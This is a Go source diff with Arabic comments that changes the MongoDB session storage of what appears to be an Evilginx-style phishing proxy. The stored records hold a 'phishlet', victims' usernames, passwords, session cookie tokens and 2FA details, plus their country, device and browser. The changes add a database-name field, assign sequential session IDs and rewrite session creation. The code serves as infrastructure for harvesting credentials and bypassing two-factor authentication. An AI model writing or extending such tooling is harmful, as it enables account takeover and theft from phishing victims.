@@ -21,6 +21,7 @@ type MongoDatabase struct {
 	sessionsColl *mongo.Collection
 	ctx          context.Context
 	cancel       context.CancelFunc
+	dbName       string
 }
 
 // Session مع تعديلات لدعم MongoDB
@@ -118,6 +119,7 @@ func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
 		sessionsColl: sessionsColl,
 		ctx:          background,
 		cancel:       cancel,
+		dbName:       dbName,
 	}, nil
 }
 
@@ -190,8 +192,9 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 		}
 	}
 
+	// نحول ObjectID إلى int باستخدام الحقل Id من MongoSession
 	return &Session{
-		Id:           ms.ID,
+		Id:           ms.Id, // استخدام ms.Id بدلاً من ms.ID (ObjectID)
 		Phishlet:     ms.Phishlet,
 		LandingURL:   ms.LandingURL,
 		Username:     ms.Username,
@@ -265,45 +268,43 @@ func (m *MongoDatabase) CreateSession(
 	deviceType, browserType, browserVersion, osType, osVersion string,
 	loginType string, has2FA bool, type2FA string,
 ) error {
-	s := &Session{
-		Id: primitive.NewObjectID(),
-		SID: sid,
-		Phishlet: phishlet,
-		LandingURL: landingURL,
-		Username: "",
-		Password: "",
-		Custom: make(map[string]string),
-		Params: make(map[string]string),
-		BodyTokens: make(map[string]string),
-		HttpTokens: make(map[string]string),
-		CookieTokens: make(map[string]map[string]*CookieToken),
-		UserAgent: useragent,
-		RemoteAddr: remoteAddr,
-		CreateTime: time.Now().Unix(),
-		UpdateTime: time.Now().Unix(),
-
-		// إضافة الحقول الجديدة
-		CountryCode: countryCode,
-		CountryName: countryName,
-		DeviceType: deviceType,
-		BrowserType: browserType,
-		BrowserVersion: browserVersion,
-		OSType: osType,
-		OSVersion: osVersion,
-		LoginType: loginType,
-		Has2FA: has2FA,
-		Type2FA: type2FA,
-	}
-
-	// تحويل إلى BSON
-	bs, err := bson.Marshal(s)
+	// حصول على آخر معرف
+	lastId, err := m.GetLastSessionId()
 	if err != nil {
-		return err
+		lastId = 0
+	}
+	
+	// إنشاء كائن MongoSession بدلاً من Session
+	mongoSession := &MongoSession{
+		ID:            primitive.NewObjectID(),
+		Id:            lastId + 1,
+		Phishlet:      phishlet,
+		LandingURL:    landingURL,
+		Username:      "",
+		Password:      "",
+		Custom:        make(map[string]string),
+		BodyTokens:    make(map[string]string),
+		HttpTokens:    make(map[string]string),
+		CookieTokens:  make(map[string]map[string]interface{}),
+		SessionId:     sid,
+		UserAgent:     useragent,
+		RemoteAddr:    remoteAddr,
+		CreateTime:    time.Now().Unix(),
+		UpdateTime:    time.Now().Unix(),
+		CountryCode:   countryCode,
+		CountryName:   countryName,
+		DeviceType:    deviceType,
+		BrowserType:   browserType,
+		BrowserVersion: browserVersion,
+		OSType:        osType,
+		OSVersion:     osVersion,
+		LoginType:     loginType,
+		Has2FA:        has2FA,
+		Type2FA:       type2FA,
 	}
 
 	// حفظ في قاعدة البيانات
-	coll := m.client.Database(m.dbName).Collection("sessions")
-	_, err = coll.InsertOne(context.Background(), bs)
+	_, err = m.sessionsColl.InsertOne(m.ctx, mongoSession)
 	return err
 }
 
